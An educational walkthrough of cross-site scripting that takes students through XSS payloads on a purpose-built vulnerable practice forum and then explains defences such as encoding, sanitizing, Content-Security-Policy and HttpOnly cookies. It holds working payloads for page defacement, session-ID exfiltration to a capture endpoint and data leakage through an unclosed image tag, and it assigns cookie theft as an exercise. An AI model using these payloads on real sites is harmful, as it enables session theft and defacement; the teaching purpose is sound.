---
title: Cross-Site Scripting (XSS) Walkthrough
---
[Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) is a type of injection attack where scripts, links, or other malicious code are inserted into user-supplied content on a website. [OWASP](https://owasp.org/) considers "cross-site scripting" to be a misnomer since not all XSS attacks involve more than one website. Nevertheless, it is the industry-accepted name for this type of attack.

> **Warning:** Attempting to attack a website or computer system without authorization is illegal. While doing this walkthrough and experimenting with the website, you have permission to practice XSS exploits on [ScriptBoard.dicax.org](https://scriptboard.dicax.org). Nevertheless, you are **not** permitted to attack or seek vulnerabilities on the web host. You should use the knowledge you gain from these activities to make your own applications more secure. You should not use the knowledge and skills you gain to attack other sites without permission from the owners. ScriptBoard is designed to restrict your exploits to your own computer and session. You should not attempt to break into other users' sessions.

[ScriptBoard](https://scriptboard.dicax.org) simulates an online forum or message board with two special characteristics. First, it is vulnerable to XSS type exploits. Second, each session is restricted to viewing the messages posted from that session. In other words, you can only see your own message. This is to keep you from posting exploits that would affect someone else.

Browse to [https://scriptboard.dicax.org](https://scriptboard.dicax.org){: target="_blank"}. You will see an empty message board. Write a message and click `Post` to see how it works.

The message board supports HTML so that you can format text. (You will exploit that later.) For now, post something benign like bolding some text.

```
Rise and <b>shout!</b>
```

Create a simple exploit by putting a popup message on the screen. This sort of thing is a quick way to test whether a site has XSS vulnerabilities.

```
<span onmouseover="alert('gotcha!')">My name is Scott!</span>
```

Hover over the new message and you should get an alert popup.

You can use some script to **deface** the site by changing text. A more sophisticated attack might even add images. Compared to what's possible, this one is relatively mild:

```
<b>Show me.</b>
<script>
document.getElementById("sitename").textContent = "Freefall Experience";
</script>
```

Notice that the title has changed. Of course, this walkthrough gave away that the needed element ID is `sitename` Suppose you didn't know the ID. You could find it by opening the inspector in the browser and locating the appropriate element in the HTML tree.

You can retrieve data from other sites and insert it. Here's an example that gets a scripture from our [Scripture of the Day service](https://scripture.dicax.org) and inserts it into the message board.

```
<span id="xss43"></span>
<script>
fetch("https://scripture.dicax.org/api/second")
    .then((response) => response.json())
    .then((json) => document.getElementById("xss43").textContent = json.text);
</script>
```

More damaging would be to steal data from a site and post it somewhere else. ScriptBoard has a URL for capturing information at [https://scriptboard.dicax.org/Capture](https://scriptboard.dicax.org/Capture). Anything you put in the query string or the POST data will be captured and you can view all captures by browsing to [https://scriptboard.dicax.org/ViewCaptures](https://scriptboard.dicax.org/ViewCaptures). (A `Captures` link is in the upper-right.)

The page has a hidden element storing the `Session ID`. Retrieve that data and send it to the capture URL like this:

```
<script>
fetch("/Capture?sessionId=" + document.getElementById("sessionId").textContent);
</script>
No exploit here. Nope, definitely not!
```

Now look at the ViewCaptures page (by clicking `Captures` in the upper-right) to see what has been collected. Of course, a real exploit would send captured data to a different server that is controlled by the attacker.

Scripting doesn't have to be enabled to successfully apply an XSS attack. In the following example we deliberately fail to close quotes on an image link. The browser will treat everything following this post up to the next quote as part of the query string. And, since the link is to the `Captures` URL the data will be captured. After putting this in a post, go check [ViewCaptures](https://scriptboard.dicax.org/ViewCaptures) to see what it found.

```
Hello.<img src="/Capture?data=
```

One common way to prevent XSS attacks is to HTML encode all user-provided content. While doing so doesn't support using HTML tags for rich text, it ensures that no malicious code can be injected. ScriptBoard has a "safe" version of the main page that does just that; HTML Encode all user-supplied data. Click the `Safe` link in the upper-right menu to see all of the posts without exploits.

## On Your Own

You can experiment with other XSS exploits on the site. Try to do the following, or come up with your own exploits:

* The page has some JavaScript that will unscramble a hidden message. Make that message appear somewhere or send it to the captures.
* Display the hidden `sessionId` value instead of capturing it.
* Steal the cookie and send it to the captures. (Note: The real session cookie is protected from JavaScript. The one you can find with an exploit is a simulated session cookie.)
* Change colors or fonts.

> **Remember:** You are authorized to experiment with exploits on your own ScriptBoard session. While the server doesn't have known cross-session vulnerabilities we still don't authorize you to attempt breaking into the server or accessing other sessions.

## Protecting Against XSS Attacks

There are three direct ways to protect against Cross-Site Scripting Attacks:
* Do not accept user-supplied content.
* Encode user-supplied content
* Sanitize user-supplied content
* Make use of protections in your web framework

The simplest approach is to design your application in such a way that no user-supplied content is accepted. Of course, that eliminates any kind of social media site not to mention tools like the task list we build in this class.

User-supplied content can be HTML encoded on the server side. On the browser side you can the `textContent` or `innerText` properties to ensure that user-supplied content is treated as plain text and not interpreted as HTML. This is a common method but it does not allow rich text such as bold, font changes, colors, and so forth.

A more difficult approach is to sanitize user-supplied content to allow some HTML while prohibiting embedded scripts, ensuring that all tags are closed, and so forth. Doing so requires some sophisticated code that can parse and validate HTML and then remove prohibited tags and properties. If you want to take that approach, it is best to use an existing and tested sanitizing library. Careful implementations can even allow embedded content like the Scripture of the Day example while still protecting against exploits. This can be done by using an [<iframe>](https://www.w3schools.com/tags/tag_iframe.asp) element with settings that keep the embedded content within an isolated sandbox.

Most web frameworks have built-in tools to help combat XSS vulnerabilities. You should be aware of the XSS protections afforded by your framework and use them properly. For example, PHP is notorious for not HTML encoding by default (most other frameworks encode by default). Nevertheless, it offers the [htmlspecialchars()](https://www.geeksforgeeks.org/how-to-prevent-xss-with-html-php/) function which should be used liberally.

### Second Lines of Defense

Tools that provide secondary protection include:
* Content-Security-Policy Header
* HttpOnly Cookie Setting

The [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP header controls what the browser will allow a page to do. It can restrict the domains from which images and scripts can be retrieved, control the domains that can be accessed by [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API), disable scripts altogether, and much more. It is often used with [<iframe>](https://www.w3schools.com/tags/tag_iframe.asp) to create a restricted sandbox for user-supplied content.

The [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly) cookie setting prevents JavaScript from having access to a particular cookie. In this demo, we used `HttpOnly` to protect the real session cookie while exposing a fake sample to JavaScript.

## Other Resources
* [OWASP Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) (An excellent, authoritative source.)
* [OWASP Cross-Site Scripting Page](https://owasp.org/www-community/attacks/xss/)
* [Preventing Cross-Site Scripting in PHP](https://www.geeksforgeeks.org/how-to-prevent-xss-with-html-php/)
* [MDN Cross-Site Scripting](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)